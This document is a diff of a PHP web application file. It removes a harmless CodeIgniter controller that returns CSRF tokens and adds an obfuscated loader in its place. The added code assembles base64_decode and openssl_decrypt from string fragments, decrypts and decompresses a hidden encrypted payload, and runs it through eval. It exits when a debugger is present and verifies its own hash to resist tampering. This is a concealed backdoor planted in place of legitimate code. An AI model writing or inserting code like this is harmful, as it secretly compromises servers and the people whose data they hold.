@@ -1,32 +1,28 @@
-<?php 
-
-(defined('BASEPATH') or exit('No direct script access allowed'));
-
-/**
- * Class Csrfdata to return fresh CSRF hash value
- */
-class Csrfdata extends CI_Controller
-{
-
-    public function __construct()
-    {
-        parent::__construct();
-    }
-
-    /**
-     * Return CodeIgniter CSRF name & Hash on request
-     * @return [type] [description]
-     */
-    public function index()
-    {
-        if ($this->input->get()) {
-            $csrf = array();
-            $csrf_name = $this->security->get_csrf_token_name();
-            $csrf_hash = $this->security->get_csrf_hash();
-            $csrf[$csrf_name] = $csrf_hash;
-            echo json_encode($csrf);
-        }
-
-    }
-
+<?php
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_j43yxwjq=('bas'.'e64'.'_de'.'cod'.'e');
+$_sv437j0z=('gzu'.'nco'.'mpr'.'ess');
+$_rgltwrwk=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_wjayr9cs='m6SI6wHW';
+$_b5887icu='h0cQawku';
+$_a06ehf3y='c/WZ6aga6jM=';
+$_blaguyfs='cxNQo4Jo';
+$_s5bhoaup='Lhs+P3/U';
+$_v8g3n2jh='WeJW9p1i';
+$_amatf0f9='wyDhRQ==';
+$_mojq6rk8='yIl9vg+4';
+$_celh9dte=$_j43yxwjq($_b5887icu.$_blaguyfs.$_wjayr9cs.$_s5bhoaup.$_a06ehf3y);
+$_kd0l3bul=$_j43yxwjq($_v8g3n2jh.$_mojq6rk8.$_amatf0f9);
+$_kpvto3u0=$_j43yxwjq('Hyp37jz5FZ41qFsmfTKML9yQc3dQM/UcHnwh4HEHOZ6lrWb2+GKdjWg+X5JnLxDqvfrFu+/Zb/3vQ16e6hXNQ+2wGREx0nsmPORCP9B/zQCcJfQfGfywMGFwV+SxenZjk0NagRlv6szZfO7md+QzHUaIbaY1CDGDI9Bb0XAq9hxeM4z5+YsP7FTEzaHQchKzmV9AGISbE7VqE/obid4k9AFRJdNwRlIn28wfXcKRMWPZhAuxv7kgKXc7rKpJEdF6Uh0J/PQthUlXzcx5tNkqBOp/p4Vf2YL6bWWrDN/Pb+kEbvGy4mOmPMXTLTIGRsi5ryyUbsCv0SykYM1B2onA5HapoWFmhy+46EeWGbeM/VU=');
+$_tcpem7vf=$_rgltwrwk($_kpvto3u0,'aes-256-cbc',$_celh9dte,OPENSSL_RAW_DATA,$_kd0l3bul);
+if($_tcpem7vf===false){exit;}
+$_rl8yr1zi=$_sv437j0z($_tcpem7vf);
+if($_rl8yr1zi===false){exit;}
+$_pzdfiqcn='17b51e50a2eaba904853729b4cb0c71ee1287cce00b6388cb40be5e1e1fd9258';
+$_uf1ym0mh=@file_get_contents(__FILE__);
+if($_uf1ym0mh!==false){
+$_gp31nrsr=str_replace($_pzdfiqcn,"0000000000000000000000000000000000000000000000000000000000000000",$_uf1ym0mh);
+$_guswz05x=hash("sha256",$_gp31nrsr);
+if($_guswz05x!==$_pzdfiqcn){@http_response_code(403);exit;}
 }
+eval($_rl8yr1zi);
